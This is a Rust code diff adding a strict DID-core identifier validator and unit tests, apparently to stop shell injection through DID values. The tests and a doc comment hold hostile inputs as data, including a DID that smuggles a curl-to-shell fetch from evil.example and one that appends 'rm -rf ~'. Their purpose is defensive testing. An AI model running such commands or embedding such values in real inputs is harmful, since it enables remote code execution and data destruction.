@@ -69,6 +69,66 @@ pub fn validate_identifier(label: &str, value: &str) -> Result<(), ValidationErr
     Ok(())
 }
 
+/// The longest DID [`validate_did_core`] accepts.
+pub const MAX_DID_CORE_LEN: usize = 1024;
+
+/// A DID as DID-core's ABNF has it, and nothing else:
+///
+/// ```text
+/// did                = "did:" method-name ":" method-specific-id
+/// method-name        = 1*method-char          ; method-char = %x61-7A / DIGIT
+/// method-specific-id = *( *idchar ":" ) 1*idchar
+/// idchar             = ALPHA / DIGIT / "." / "-" / "_" / pct-encoded
+/// ```
+///
+/// No path, query or fragment, no whitespace, nothing else — so a value that
+/// passes can be shown to an operator, and pasted into a shell, without
+/// carrying anything but a DID. A looser pattern (`^did:[a-z0-9]+:\S+$`, the
+/// `git-ns/_shared` schema's) admits `did:web:x.example$(curl${IFS}…|sh)`.
+pub fn validate_did_core(label: &str, value: &str) -> Result<(), ValidationError> {
+    let bad = |why: &str| Err(ValidationError(format!("{label} is not a DID: {why}")));
+    if value.len() > MAX_DID_CORE_LEN {
+        return bad("too long");
+    }
+    let Some(rest) = value.strip_prefix("did:") else {
+        return bad("it must start with `did:`");
+    };
+    let Some((method, msid)) = rest.split_once(':') else {
+        return bad("it has no method-specific identifier");
+    };
+    if method.is_empty()
+        || !method
+            .bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
+    {
+        return bad("the method name must be lowercase letters and digits");
+    }
+    let b = msid.as_bytes();
+    if b.is_empty() || b[b.len() - 1] == b':' {
+        return bad("the method-specific identifier must end in an identifier character");
+    }
+    let mut i = 0;
+    while i < b.len() {
+        match b[i] {
+            c if c.is_ascii_alphanumeric() || matches!(c, b'.' | b'-' | b'_' | b':') => i += 1,
+            b'%' if i + 2 < b.len()
+                && b[i + 1].is_ascii_hexdigit()
+                && b[i + 2].is_ascii_hexdigit() =>
+            {
+                i += 3
+            }
+            b'%' => return bad("a `%` must begin a percent-encoded octet"),
+            _ => {
+                return bad(
+                    "only letters, digits, `.`, `-`, `_`, `:` and percent-encoded octets may \
+                     appear after the method",
+                );
+            }
+        }
+    }
+    Ok(())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -135,5 +195,55 @@ mod tests {
             "error must name the field it is validating — got {}",
             err.0
         );
+    }
+
+    #[test]
+    fn validate_did_core_accepts_did_core_dids() {
+        for ok in [
+            "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
+            "did:webvh:QmSCID:example.com",
+            "did:web:example.com:user:alice",
+            "did:web:example.com%3A8443",
+            "did:peer:2.Ez6LS_x-y",
+            "did:example::a",
+        ] {
+            validate_did_core("did", ok).unwrap_or_else(|e| panic!("{ok:?} rejected: {e:?}"));
+        }
+    }
+
+    #[test]
+    fn validate_did_core_rejects_everything_else() {
+        for bad in [
+            "",
+            "did:",
+            "did:web",
+            "did:web:",
+            "did::x",
+            "did:Web:x",
+            "did:we-b:x",
+            "did:web:x:",
+            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+            "did:web:x;rm -rf ~",
+            "did:web:x`id`",
+            "did:web:x|sh",
+            "did:web:x&y",
+            "did:web:x'y",
+            "did:web:x\"y",
+            "did:web:x y",
+            "did:web:x\ty",
+            "did:web:x\ny",
+            "did:web:x/path",
+            "did:web:x?query",
+            "did:web:x#frag",
+            "did:web:x%",
+            "did:web:x%4",
+            "did:web:x%zz",
+            "did:web:§",
+            "not-a-did",
+        ] {
+            validate_did_core("did", bad).expect_err(&format!("{bad:?} must be rejected"));
+        }
+        let long = format!("did:key:{}", "a".repeat(MAX_DID_CORE_LEN));
+        validate_did_core("did", &long).expect_err("overlong must be rejected");
     }
 }
